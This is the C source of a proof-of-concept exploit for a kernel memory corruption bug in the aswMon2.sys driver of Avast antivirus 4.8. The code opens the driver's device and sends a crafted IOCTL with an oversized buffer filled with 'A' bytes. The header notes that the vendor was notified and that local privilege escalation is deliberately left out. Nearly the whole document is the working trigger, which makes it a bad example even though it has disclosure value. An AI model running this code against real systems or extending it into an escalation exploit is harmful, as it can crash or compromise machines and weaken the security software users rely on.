/* Avast 4.8.1351.0 antivirus aswMon2.sys Kernel Memory Corruption
 *
 * Author: Giuseppe 'Evilcry' Bonfa'
 * E-Mail: evilcry _AT_ gmail _DOT_ com
 * Website: http://evilcry.netsons.org
 *          http://evilcodecave.blogspot.com 
 *          http://evilfingers.com
 *
 * Vendor: Notified
 *
 * No L.P.E. for kiddies
 * /

#define WIN32_LEAN_AND_MEAN
#include < windows.h>
#include < stdio.h>


BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice) //taken from esagelab
{
        WCHAR DeviceName[MAX_PATH];
        HANDLE hDevice;

        if ((GetVersion() & 0xFF) >= 5) 
        {
                wcscpy(DeviceName, L"\\\\.\\Global\\");
        } 
        else 
        {
                wcscpy(DeviceName, L"\\\\.\\");
        }

        wcscat(DeviceName, DriverName);

        printf("Opening.. %S\n", DeviceName);

        hDevice = CreateFileW(DeviceName, GENERIC_READ | 
        GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);

        if (hDevice == INVALID_HANDLE_VALUE)
        {
                printf("CreateFile() ERROR %d\n", GetLastError());
                return FALSE;
        }

        *lphDevice = hDevice;

       return TRUE;
}

int main()
{
        HANDLE hDev = NULL;
        DWORD Junk;

        if(!OpenDevice(L"aswMon",&hDev))
        {
                printf("Unable to access aswMon");
                return(0);
        }

        char *Buff = (char *)VirtualAlloc(NULL, 0x288, MEM_RESERVE | 
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (Buff)
        {
                memset(Buff, 'A', 0x288);
                DeviceIoControl(hDev,0xB2C80018,Buff,
                0x288,Buff,0x288,&Junk,(LPOVERLAPPED)NULL);
                printf("DeviceIoControl Executed..\n"); 
        }    
        else
        {
                printf("VirtualAlloc() ERROR %d\n", GetLastError());
        }


        return(0);
}